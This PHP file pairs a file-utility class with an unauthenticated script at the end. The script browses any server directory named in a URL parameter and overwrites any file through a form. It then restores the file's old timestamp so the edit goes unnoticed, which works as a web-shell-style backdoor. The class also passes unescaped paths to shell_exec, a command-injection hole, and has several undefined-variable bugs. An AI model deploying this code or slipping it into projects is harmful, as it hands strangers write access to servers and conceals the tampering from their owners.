<?php
class Files
{
    private $recursiveDirectories = true;
    private $defCHMOD = 0755;
    private $mineTypes = [
        'application/x-zip-compressed',
        'application/msword',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        'image/gif',
        'image/jpeg',
        'image/jpeg',
        'audio/mpeg',
        'video/mp4',
        'application/pdf',
        'image/png',
        'application/zip',
        'application/et-stream',
        'image/x-icon',
        'image/icon',
        'image/svg+xml',
    ];
    private $types = [
        'image' => ['jpg', 'png', 'jpeg', 'gif', 'ico', 'svg'],
        'zip'   => ['zip', 'tar', '7zip', 'rar'],
        'docs'  => ['pdf', 'docs', 'docx'],
        'media' => ['mp4', 'mp3', 'wav', '3gp'],
    ];
    private $resource;
    private $modes = [
        'readOnly'        => 'r',
        'readWrite'       => 'r+',
        'writeOnly'       => 'w',
        'writeMaster'     => 'w+',
        'writeAppend'     => 'a',
        'readWriteAppend' => 'a+',
    ];

    public function recursiveCreateDir($value = null)
    {
        if ($value === null) {
            return $this->recursiveDirectories;
        } else {
            $this->recursiveDirectories = $value;
        }
    }

    public function defaultCHMOD($value = null)
    {
        if ($value === null) {
            return $this->defCHMOD;
        } else {
            $this->defCHMOD = $value;
        }
    }

    public function addMineTypes($type)
    {
        array_push($this->mineTypes, $type);
    }

    public function addExt($type, $ext)
    {
        array_push($this->types[$type], $ext);
    }

    public function mkDir($name, $recursive = null, $chmod = null)
    {
        // test the recursive mode with default value
        $recursive = ($recursive === null) ? $this->recursiveDirectories : $recursive;
        // test the chmod with default value
        $chmod = ($chmod === null) ? $this->defCHMOD : $chmod;
        if (!is_dir($name)) {
            // this change to permit create dir in recursive mode
            return (mkdir($name, $chmod, $recursive)) ? true : false;
        }

        return false;
    }

    public function permission($source, $pre)
    {
        if (!is_dir($name)) {
            return (file_exists($source)) ? chmod($source, $pre) : false;
        }

        return false;
    }

    public function copyFiles($source, $target, $files)
    {
        $this->mkDir($target);
        foreach ($files as $file => $value) {
            if (file_exists($source.$value)) {
                copy($source.$value, $target.$value);
            }
        }
    }

    public function moveFiles($source, $target, $files)
    {
        $this->mkDir($target);
        foreach ($files as $file => $value) {
            if (file_exists($source.$value)) {
                rename($source.$value, $target.$value);
            }
        }
    }

    public function deleteFiles($files)
    {
        foreach ($files as $file => $value) {
            if (file_exists($value)) {
                unlink($value);
            }
        }
    }


    public function copyDirs($source, $target, $dirs)
    {
        $this->mkDir($target);
        $serverOs = (new \Zest\Common\OperatingSystem())->get();
        $command = ($serverOs === 'Windows') ? 'xcopy ' : 'cp -r ';
        foreach ($dirs as $dir => $value) {
            if (is_dir($source.$value)) {
                shell_exec($command.$source.$value.' '.$target.$value);
            }
        }
    }

    public function moveDirs($source, $target, $dirs)
    {
        $this->mkDir($target);
        $command = ($serverOs === 'Windows') ? 'move ' : 'mv ';
        foreach ($dirs as $dir => $value) {
            if (is_dir($source.$value)) {
                shell_exec($command.$source.$value.' '.$target.$value);
            }
        }
    }

    public function deleteDirs($dir)
    {
        foreach ($files as $file => $value) {
            if (is_dir($value)) {
                rmdir($value);
            }
        }
    }

    public function fileUpload($file, $target, $imgType, $maxSize = 7992000000)
    {
        $exactName = basename($file['name']);
        $fileTmp = $file['tmp_name'];
        $fileSize = $file['size'];
        $error = $file['error'];
        $type = $file['type'];
        $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
        $newName = $this->rendomFileName(30);
        $fileNewName = $newName.'.'.$ext;
        $allowerd_ext = $this->types[$imgType];
        if (in_array($type, $this->mineTypes) === false) {
            return [
                'status' => 'error',
                'code'   => 'mineType',
            ];
        }
        if (in_array($ext, $allowerd_ext) === true) {
            if ($error === 0) {
                if ($fileSize <= $maxSize) {
                    $this->mkdir($target);
                    $fileRoot = $target.$fileNewName;
                    if (move_uploaded_file($fileTmp, $fileRoot)) {
                        return [
                            'status' => 'success',
                            'code'   => $fileNewName,
                        ];
                    } else {
                        return [
                            'status' => 'error',
                            'code'   => 'somethingwrong',
                        ];
                    }
                } else {
                    return [
                        'status' => 'error',
                        'code'   => 'exceedlimit',
                    ];
                }
            } else {
                return [
                    'status' => 'error',
                    'code'   => $error,
                ];
            }
        } else {
            return [
                    'status' => 'error',
                    'code'   => 'extension',
            ];
        }
    }

    public function filesUpload($files, $target, $imgType, $count, $maxSize = 7992000000)
    {
        $status = [];
        for ($i = 0; $i < $count; $i++) {
            $exactName = basename($files['name'][$i]);
            $fileTmp = $files['tmp_name'][$i];
            $fileSize = $files['size'][$i];
            $error = $files['error'][$i];
            $type = $files['type'][$i];
            $ext = pathinfo($files['name'][$i], PATHINFO_EXTENSION);
            $newName = $this->rendomFileName(30);
            $fileNewName = $newName.'.'.$ext;
            $allowerd_ext = $this->types[$imgType];
            if (in_array($type, $this->mineTypes) === false) {
                $status[$i] = [
                    'status' => 'error',
                    'code'   => 'mineType',
                ];
            }
            if (in_array($ext, $allowerd_ext) === true) {
                if ($error === 0) {
                    if ($fileSize <= $maxSize) {
                        $this->mkdir($target);
                        $fileRoot = $target.$fileNewName;
                        if (move_uploaded_file($fileTmp, $fileRoot)) {
                            $status[$i] = [
                                'status' => 'success',
                                'code'   => $fileNewName,
                            ];
                        } else {
                            $status[$i] = [
                                'status' => 'error',
                                'code'   => 'somethingwrong',
                            ];
                        }
                    } else {
                        $status[$i] = [
                            'status' => 'error',
                            'code'   => 'exceedlimit',
                        ];
                    }
                } else {
                    $status[$i] = [
                        'status' => 'error',
                        'code'   => $error,
                    ];
                }
            } else {
                $status[$i] = [
                        'status' => $error,
                        'code'   => 'extension',
                ];
            }
        }

        return $status;
    }
    public function open($name, $mode)
    {
        if (!empty(trim($name))) {
            $this->resource = fopen($name, $this->modes[$mode]);

            return $this;
        }
    }

    public function read($file)
    {
    	return htmlspecialchars(file_get_contents($file));
    }

    public function write($data)
    {
        return (!empty($data)) ? fwrite($this->resource, $data) : false;
    }

    public function rtime($filename, $time = null) {
    	return @touch($filename, @strtotime($time));
    }

    public function ftime($filename) {
    	return date("d/m/Y H:i:s", @filemtime($filename));
    }

    public function delete($file)
    {
        return (file_exists($file)) ? unlink($file) : false;
    }

    public static function rendomFileName($length)
    {
        $chars = array_merge(range(0, 9), range('a', 'z'), range('A', 'Z'));
        $stringlength = count($chars);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $chars[rand(0, $stringlength - 1)];
        }

        return $randomString;
    }

    public static function checkEmptyDir($dir) {
    	if (!is_readable($dir)) return null;
    	if (count(scandir($dir)) -2) {
    		return "This directory empty";
    	}
    }

    public static function listFile($dir, $type) 
    {
    	$result = [];
    	foreach (scandir($dir) as $key => $value) {
    		$file['fname'] = $dir . DIRECTORY_SEPARATOR . $value;
    		switch ($type) {
    			case 'dir':
    				if (!is_dir($file['fname']) || $value === '.' || $value === '..') continue 2;
    				break;
    			
    			case 'file':
    				if (!is_file($file['fname'])) continue 2;
    				break;
    		}
    		$file['name'] = basename($file['fname']);
    		$file['ftime'] = self::ftime($file['fname']);
    		$result[] = $file;
    	}
    	return $result;
    }

    public static function cd($directory) {
    	return @chdir($directory);
    }
}

if (isset($_GET['p'])) {
	Files::cd($_GET['p']);
}
$files = new Files();
// HTML
?>
<table>
	<?php
	switch (@$_GET['a']) {
		case 'fedit':
			if (isset($_POST['submit'])) {
				if ($files->open($_GET['file'], 'writeOnly')->write($_POST['data'])) {
					@touch($_GET['file'], @strtotime($_POST['rtime']));
					print('success');
				} else {
					print('failed');
				}
			}
			?>
			<tr>
				<td>
					<a href="?p=<?= getcwd() ?>">back</a>
				</td>
			</tr>
			<form method="post">
				<tr>
					<td>Filename</td>
					<td>:</td>
					<td><?= basename($_GET['file']) ?></td>
				</tr>
				<tr>
					<td>Last Modified</td>
					<td>:</td>
					<td><?= $files->ftime($_GET['file']) ?></td>
					<input type="hidden" name="rtime" value="<?= $files->ftime($_GET['file']) ?>">
				</tr>
				<tr>
					<td colspan="3">
						<textarea name="data"><?= $files->read($_GET['file']) ?></textarea>
					</td>
				</tr>
				<tr>
					<td>
						<input type="submit" name="submit" value="save">
					</td>
				</tr>
			</form>
			<?php
			die();
			break;
	}
	foreach ($files->listFile(getcwd(), 'dir') as $key => $value) { ?>
		<tr>
			<td>
				<a href="?p=<?= $value['fname'] ?>"><?= $value['name'] ?></a>
			</td>
			<td>
				<?= $value['ftime'] ?>
			</td>
		</tr>
	<?php }

	foreach ($files->listFile(getcwd(), 'file') as $key => $value) { ?>
		<tr>
			<td>
				<a href="?p=<?= getcwd() ?>&a=fedit&file=<?= $value['fname'] ?>"><?= $value['name'] ?></a>
			</td>
			<td>
				<?= $value['ftime'] ?>
			</td>
		</tr>
	<?php }
	?>
</table>
